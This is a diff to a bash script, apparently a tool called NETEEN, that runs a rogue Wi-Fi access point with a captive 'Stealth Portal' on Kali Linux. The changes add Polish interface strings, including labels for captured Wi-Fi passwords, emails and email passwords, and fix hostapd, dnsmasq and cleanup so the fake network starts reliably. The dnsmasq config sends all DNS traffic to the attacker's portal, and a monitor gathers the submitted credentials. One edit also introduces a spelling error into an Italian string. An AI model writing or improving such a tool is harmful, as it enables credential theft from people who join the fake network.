@@ -26,6 +26,7 @@ PLATFORM="KaliLinux"
 CURRENT_LANG="en"
 MONITOR_PID=""
 WAITER_PID=""
+HOSTAPD_PID=""
 
 # Language strings declaration
 declare -A LANG_STRINGS
@@ -565,7 +566,7 @@ init_languages() {
     LANG_STRINGS["it",84]="Avvio Portale"
     LANG_STRINGS["it",85]="RISULTATI SCAN RETE"
     LANG_STRINGS["it",86]="Monitoraggio credenziali attivo..."
-    LANG_STRINGS["it",87]="Nota: Portale Stealth su macOS ha funzionalità limitata"
+    LANG_STRINGS["it",87]="Nota: Portale Stealth su macOS ha funzionalità limitada"
     LANG_STRINGS["it",88]="Alcune funzionalità potrebbero non funzionare come previsto"
     LANG_STRINGS["it",89]="Nota: La configurazione dell'interfaccia su macOS potrebbe richiedere configurazione aggiuntiva"
     LANG_STRINGS["it",90]="La funzionalità completa richiede Kali Linux"
@@ -1095,6 +1096,109 @@ init_languages() {
     LANG_STRINGS["ar",99]="المنصة المكتشفة:"
     LANG_STRINGS["ar",100]="بالاتصال، فإنك توافق على شروط الخدمة الخاصة بنا"
     LANG_STRINGS["ar",101]="تغيير اللغة"
+
+    # Polish
+    LANG_STRINGS["pl",1]="Portal Ukryty"
+    LANG_STRINGS["pl",2]="Skaner Sieci"
+    LANG_STRINGS["pl",3]="Wyjście"
+    LANG_STRINGS["pl",4]="Wybierz platformę:"
+    LANG_STRINGS["pl",5]="macOS"
+    LANG_STRINGS["pl",6]="Kali Linux"
+    LANG_STRINGS["pl",7]="Wybierz język:"
+    LANG_STRINGS["pl",8]="Angielski"
+    LANG_STRINGS["pl",9]="Hiszpański"
+    LANG_STRINGS["pl",10]="Francuski"
+    LANG_STRINGS["pl",11]="Niemiecki"
+    LANG_STRINGS["pl",12]="Włoski"
+    LANG_STRINGS["pl",13]="Portugalski"
+    LANG_STRINGS["pl",14]="Rosyjski"
+    LANG_STRINGS["pl",15]="Chiński"
+    LANG_STRINGS["pl",16]="Japoński"
+    LANG_STRINGS["pl",17]="Arabski"
+    LANG_STRINGS["pl",18]="Dostępne Interfejsy"
+    LANG_STRINGS["pl",19]="Nie znaleziono lub niedostępnych interfejsów bezprzewodowych"
+    LANG_STRINGS["pl",20]="Wybierz interfejs"
+    LANG_STRINGS["pl",21]="Wybrano:"
+    LANG_STRINGS["pl",22]="Nieprawidłowy wybór"
+    LANG_STRINGS["pl",23]="Sprawdzanie zależności..."
+    LANG_STRINGS["pl",24]="Brakujące pakiety:"
+    LANG_STRINGS["pl",25]="Instalowanie zależności..."
+    LANG_STRINGS["pl",26]="Wszystkie zależności zainstalowane"
+    LANG_STRINGS["pl",27]="Uruchom jako root: sudo ./NETEEN.sh"
+    LANG_STRINGS["pl",28]="Uruchamianie Portalu Ukrytego..."
+    LANG_STRINGS["pl",29]="Uruchamianie Skanera Sieci..."
+    LANG_STRINGS["pl",30]="Skanowanie sieci..."
+    LANG_STRINGS["pl",31]="Nie znaleziono interfejsu bezprzewodowego"
+    LANG_STRINGS["pl",32]="Naciśnij Enter, aby kontynuować..."
+    LANG_STRINGS["pl",33]="Nazwa SSID:"
+    LANG_STRINGS["pl",34]="Konfiguracja Portalu"
+    LANG_STRINGS["pl",35]="Wybierz Typ Portalu"
+    LANG_STRINGS["pl",36]="Domyślny Portal"
+    LANG_STRINGS["pl",37]="Niestandardowy Portal"
+    LANG_STRINGS["pl",38]="Wybierz typ"
+    LANG_STRINGS["pl",39]="Używanie domyślnego portalu"
+    LANG_STRINGS["pl",40]="Wybierz Motyw"
+    LANG_STRINGS["pl",41]="Niebieski"
+    LANG_STRINGS["pl",42]="Ciemny"
+    LANG_STRINGS["pl",43]="Zielony"
+    LANG_STRINGS["pl",44]="Czerwony"
+    LANG_STRINGS["pl",45]="Fioletowy"
+    LANG_STRINGS["pl",46]="Motyw:"
+    LANG_STRINGS["pl",47]="Tytuł Portalu"
+    LANG_STRINGS["pl",48]="Wiadomość Powitalna"
+    LANG_STRINGS["pl",49]="Etykieta Hasła WiFi"
+    LANG_STRINGS["pl",50]="Etykieta Email"
+    LANG_STRINGS["pl",51]="Etykieta Hasła Email"
+    LANG_STRINGS["pl",52]="Tekst Przycisku"
+    LANG_STRINGS["pl",53]="Komunikat Sukcesu"
+    LANG_STRINGS["pl",54]="Konfigurowanie interfejsu..."
+    LANG_STRINGS["pl",55]="Interfejs gotowy"
+    LANG_STRINGS["pl",56]="Uruchamianie punktu dostępu..."
+    LANG_STRINGS["pl",57]="AP uruchomiony"
+    LANG_STRINGS["pl",58]="Nie udało się uruchomić AP"
+    LANG_STRINGS["pl",59]="Uruchamianie DHCP..."
+    LANG_STRINGS["pl",60]="DHCP gotowy"
+    LANG_STRINGS["pl",61]="Konfigurowanie portalu..."
+    LANG_STRINGS["pl",62]="Portal gotowy"
+    LANG_STRINGS["pl",63]="Czyszczenie..."
+    LANG_STRINGS["pl",64]="Czyszczenie zakończone"
+    LANG_STRINGS["pl",65]="PORTAL AKTYWNY"
+    LANG_STRINGS["pl",66]="Interfejs"
+    LANG_STRINGS["pl",67]="Klienci"
+    LANG_STRINGS["pl",68]="Status: Oczekiwanie na połączenia"
+    LANG_STRINGS["pl",69]="Naciśnij Ctrl+C, aby zatrzymać"
+    LANG_STRINGS["pl",70]="PRZECHWYCONE DANE DOSTĘPU"
+    LANG_STRINGS["pl",71]="Czas"
+    LANG_STRINGS["pl",72]="IP"
+    LANG_STRINGS["pl",73]="Urządzenie"
+    LANG_STRINGS["pl",74]="Hasło WiFi"
+    LANG_STRINGS["pl",75]="Email"
+    LANG_STRINGS["pl",76]="Hasło"
+    LANG_STRINGS["pl",77]="Sieć"
+    LANG_STRINGS["pl",78]="Kanał"
+    LANG_STRINGS["pl",79]="Sygnał"
+    LANG_STRINGS["pl",80]="Dziękujemy za skorzystanie z NETEEN, do widzenia!"
+    LANG_STRINGS["pl",81]="MENU GŁÓWNE"
+    LANG_STRINGS["pl",82]="Do widzenia!"
+    LANG_STRINGS["pl",83]="Wybierz opcję"
+    LANG_STRINGS["pl",84]="Uruchamianie Portalu"
+    LANG_STRINGS["pl",85]="WYNIKI SKANOWANIA SIECI"
+    LANG_STRINGS["pl",86]="Monitorowanie danych dostępowych aktywne..."
+    LANG_STRINGS["pl",87]="Uwaga: Portal Ukryty na macOS ma ograniczoną funkcjonalność"
+    LANG_STRINGS["pl",88]="Niektóre funkcje mogą nie działać zgodnie z oczekiwaniami"
+    LANG_STRINGS["pl",89]="Uwaga: Konfiguracja interfejsu na macOS może wymagać dodatkowej konfiguracji"
+    LANG_STRINGS["pl",90]="Pełna funkcjonalność wymaga Kali Linux"
+    LANG_STRINGS["pl",91]="Dla macOS upewnij się, że dostępne są narzędzia bezprzewodowe"
+    LANG_STRINGS["pl",92]="Może być konieczne ręczne zainstalowanie dodatkowych narzędzi"
+    LANG_STRINGS["pl",93]="Nie znaleziono narzędzia airport. Używanie alternatywnej metody skanowania..."
+    LANG_STRINGS["pl",94]="Uwaga: Konfiguracja routingu na macOS może wymagać dodatkowej konfiguracji"
+    LANG_STRINGS["pl",95]="Wybierz platformę"
+    LANG_STRINGS["pl",96]="Wybierz język"
+    LANG_STRINGS["pl",97]="Ustawiony język:"
+    LANG_STRINGS["pl",98]="Ustawiona platforma:"
+    LANG_STRINGS["pl",99]="Wykryta platforma:"
+    LANG_STRINGS["pl",100]="Łącząc się, akceptujesz nasze warunki korzystania z usługi"
+    LANG_STRINGS["pl",101]="Zmień Język"
 }
 
 # Get language string
@@ -1120,11 +1224,12 @@ select_language() {
     echo "   8) $(get_str 15)                           "
     echo "   9) $(get_str 16)                           "
     echo "   10) $(get_str 17)                          "
+    echo "   11) Polski                                 "
     echo "╚════════════════════════════════════════════╝"
     echo -e "${NC}"
     
     while true; do
-        read -p "$(echo -e ${YELLOW}"$(get_str 96) [1-10]: "${NC})" lang_choice
+        read -p "$(echo -e ${YELLOW}"$(get_str 96) [1-11]: "${NC})" lang_choice
         
         case $lang_choice in
             1) CURRENT_LANG="en"; break ;;
@@ -1137,12 +1242,29 @@ select_language() {
             8) CURRENT_LANG="zh"; break ;;
             9) CURRENT_LANG="ja"; break ;;
             10) CURRENT_LANG="ar"; break ;;
+            11) CURRENT_LANG="pl"; break ;;
             *) echo -e "${RED}$(get_str 22)${NC}" ;;
         esac
     done
     
     echo "$CURRENT_LANG" > "$LANG_FILE"
-    echo -e "${GREEN}$(get_str 97) $(get_str $((lang_choice+7)))${NC}"
+    
+    local lang_name
+    case $CURRENT_LANG in
+        en) lang_name="$(get_str 8)" ;;
+        es) lang_name="$(get_str 9)" ;;
+        fr) lang_name="$(get_str 10)" ;;
+        de) lang_name="$(get_str 11)" ;;
+        it) lang_name="$(get_str 12)" ;;
+        pt) lang_name="$(get_str 13)" ;;
+        ru) lang_name="$(get_str 14)" ;;
+        zh) lang_name="$(get_str 15)" ;;
+        ja) lang_name="$(get_str 16)" ;;
+        ar) lang_name="$(get_str 17)" ;;
+        pl) lang_name="Polski" ;;
+    esac
+    
+    echo -e "${GREEN}$(get_str 97) $lang_name${NC}"
     sleep 1
 }
 
@@ -1608,6 +1730,11 @@ cleanup() {
         wait $WAITER_PID 2>/dev/null || true
     fi
     
+    if [ ! -z "$HOSTAPD_PID" ]; then
+        kill $HOSTAPD_PID 2>/dev/null || true
+        wait $HOSTAPD_PID 2>/dev/null || true
+    fi
+    
     # Kill all other background processes
     jobs -p | xargs -r kill -9 2>/dev/null || true
     
@@ -1627,14 +1754,19 @@ cleanup() {
     if [ ! -z "$WIFI_IFACE" ] && ip link show "$WIFI_IFACE" >/dev/null 2>&1; then
         ip addr del 192.168.1.1/24 dev "$WIFI_IFACE" 2>/dev/null || true
         ip link set "$WIFI_IFACE" down 2>/dev/null || true
+        # FIX: Bring interface back up to allow NetworkManager to manage it
+        ip link set "$WIFI_IFACE" up 2>/dev/null || true
     fi
     
-    # Restore NetworkManager
+    # Restore NetworkManager - FIXED ORDER
     systemctl unmask NetworkManager 2>/dev/null || true
     systemctl start NetworkManager 2>/dev/null || true
     
+    # Wait for NetworkManager to settle
+    sleep 2
+    
     # Clean up temp files
-    rm -f /tmp/hostapd.conf /tmp/dnsmasq.conf "$CONFIG_FILE" 2>/dev/null || true
+    rm -f /tmp/hostapd.conf /tmp/dnsmasq.conf "$CONFIG_FILE" /tmp/hostapd.log 2>/dev/null || true
     
     echo -e "${GREEN}$(get_str 64)${NC}"
     echo ""
@@ -1647,38 +1779,49 @@ set_cleanup_trap() {
     trap cleanup EXIT INT TERM
 }
 
-# Fast interface setup
+# Fixed interface setup with better cleanup
 setup_interface() {
     local iface="$1"
     
     echo -e "${YELLOW}$(get_str 54)${NC}"
     
-    # Quick stop of services
-    systemctl stop NetworkManager 2>/dev/null || true
-    systemctl mask NetworkManager 2>/dev/null || true
-    
-    # Kill interfering processes
+    # First cleanup any existing state
     pkill wpa_supplicant 2>/dev/null || true
     pkill dhclient 2>/dev/null || true
     
-    # Reset interface quickly
+    # Stop NetworkManager temporarily
+    systemctl stop NetworkManager 2>/dev/null || true
+    systemctl mask NetworkManager 2>/dev/null || true
+    
+    # Wait for interface to settle
+    sleep 2
+    
+    # Reset interface
     ip link set "$iface" down 2>/dev/null || true
+    sleep 1
+    iw dev "$iface" set type managed 2>/dev/null || true
+    sleep 1
     ip addr flush dev "$iface" 2>/dev/null || true
     ip link set "$iface" up 2>/dev/null || true
+    sleep 2
     
     # Assign IP
-    ip addr add 192.168.1.1/24 dev "$iface" 2>/dev/null || true
+    ip addr add 192.168.1.1/24 dev "$iface" 2>/dev/null
     
     echo -e "${GREEN}$(get_str 55)${NC}"
     return 0
 }
 
-# Fast AP start
+# FIXED AP start with better error handling
 start_ap() {
     local iface="$1"
     local ssid="$2"
     
     echo -e "${YELLOW}$(get_str 56)${NC}"
+    
+    # Kill any existing hostapd
+    pkill -f hostapd 2>/dev/null || true
+    sleep 1
     
     # Simple hostapd config
     cat > /tmp/hostapd.conf << EOF
@@ -1690,31 +1833,34 @@ channel=6
 ignore_broadcast_ssid=0
 EOF
     
-    # Kill any existing hostapd
-    pkill hostapd 2>/dev/null || true
+    # Start hostapd in foreground with logging
+    hostapd /tmp/hostapd.conf > /tmp/hostapd.log 2>&1 &
+    HOSTAPD_PID=$!
     
-    # Start hostapd quietly
-    hostapd -B /tmp/hostapd.conf >/dev/null 2>&1
+    # Wait for hostapd to start
+    sleep 3
     
-    # Quick check
-    sleep 1
-    if pgrep hostapd >/dev/null; then
+    # Check if hostapd is running by checking the log for success
+    if grep -q "AP-ENABLED" /tmp/hostapd.log 2>/dev/null || ps -p $HOSTAPD_PID > /dev/null 2>&1; then
         echo -e "${GREEN}$(get_str 57)${NC}"
         return 0
     else
         echo -e "${RED}$(get_str 58)${NC}"
+        echo -e "${YELLOW}Checking hostapd logs...${NC}"
+        cat /tmp/hostapd.log 2>/dev/null | tail -10
         return 1
     fi
 }
 
-# Fast DHCP start
+# Fixed DHCP start
 start_dhcp() {
     local iface="$1"
     
     echo -e "${YELLOW}$(get_str 59)${NC}"
     
     # Stop any existing dnsmasq
-    pkill dnsmasq 2>/dev/null || true
+    pkill -f dnsmasq 2>/dev/null || true
+    sleep 1
     
     # Simple dnsmasq config
     cat > /tmp/dnsmasq.conf << EOF
@@ -1726,16 +1872,26 @@ listen-address=192.168.1.1
 address=/#/192.168.1.1
 EOF
     
-    # Start dnsmasq quietly
-    dnsmasq -C /tmp/dnsmasq.conf >/dev/null 2>&1
+    # Start dnsmasq
+    dnsmasq -C /tmp/dnsmasq.conf > /dev/null 2>&1
     
-    echo -e "${GREEN}$(get_str 60)${NC}"
-    return 0
+    sleep 1
+    
+    if pgrep dnsmasq > /dev/null; then
+        echo -e "${GREEN}$(get_str 60)${NC}"
+        return 0
+    else
+        echo -e "${RED}Failed to start DHCP${NC}"
+        return 1
+    fi
 }
 
 # Setup web server
 setup_webserver() {
     echo -e "${YELLOW}$(get_str 61)${NC}"
+    
+    # Stop apache if running
+    systemctl stop apache2 2>/dev/null || true
     
     # Create web directory
     mkdir -p /var/www/html
@@ -1749,6 +1905,8 @@ setup_webserver() {
     
     # Start Apache
     systemctl start apache2 >/dev/null 2>&1
+    
+    sleep 1
     
     echo -e "${GREEN}$(get_str 62)${NC}"
     return 0
@@ -1895,6 +2053,14 @@ stealth_portal() {
     # Set cleanup trap BEFORE any setup
     set_cleanup_trap
     
+    # FIX: Pre-cleanup before starting to ensure clean state
+    echo -e "${YELLOW}Preparing system...${NC}"
+    systemctl stop NetworkManager 2>/dev/null || true
+    sleep 2
+    pkill wpa_supplicant 2>/dev/null || true
+    pkill dhclient 2>/dev/null || true
+    sleep 1
+    
     # Fast setup sequence
     setup_interface "$WIFI_IFACE" || { cleanup; return 1; }
     setup_webserver || { cleanup; return 1; }
@@ -1909,14 +2075,15 @@ stealth_portal() {
     echo "               $(get_str 65)                  "
     echo "╠════════════════════════════════════════════╣"
     printf "   ${WHITE}SSID:${NC} %-35s  \n" "$AP_NAME"
-    printf "   ${WHITE}$(get_str 66):${NC} %-28s \n"  "$WIFI_IFACE"
-    printf "  ${WHITE}$(get_str 67):${NC} %-29s \n"  "192.168.1.10-100"
-    echo "    $(get_str 68)                              "
+    printf "   ${WHITE}$(get_str 66):${NC} %-28s  \n" "$WIFI_IFACE"
+    printf "   ${WHITE}$(get_str 67):${NC} %-29s  \n" "192.168.1.10-100"
+    echo "║  $(get_str 68)                             ║"
     echo "╚════════════════════════════════════════════╝"
     echo -e "${NC}"
     
     echo -e "${YELLOW}$(get_str 69)${NC}"
     echo "──────────────────────────────────────────"
+    echo -e "${GREEN}$(get_str 86)${NC}"
     
     # Clear log file
     > /var/log/apache2/error.log
@@ -1950,16 +2117,8 @@ stealth_portal() {
     ) &
     MONITOR_PID=$!
     
-    # Simple waiter process
-    (
-        while true; do
-            sleep 1
-        done
-    ) &
-    WAITER_PID=$!
-    
-    # Wait for Ctrl+C - PROPERLY HANDLED
-    wait $WAITER_PID
+    # Wait for hostapd to finish or Ctrl+C
+    wait $HOSTAPD_PID 2>/dev/null || true
     
     # Cleanup when done
     cleanup
@@ -1970,7 +2129,7 @@ load_saved_language() {
     if [ -f "$LANG_FILE" ]; then
         saved_lang=$(cat "$LANG_FILE")
         case $saved_lang in
-            en|es|fr|de|it|pt|ru|zh|ja|ar)
+            en|es|fr|de|it|pt|ru|zh|ja|ar|pl)
                 CURRENT_LANG="$saved_lang"
                 ;;
         esac
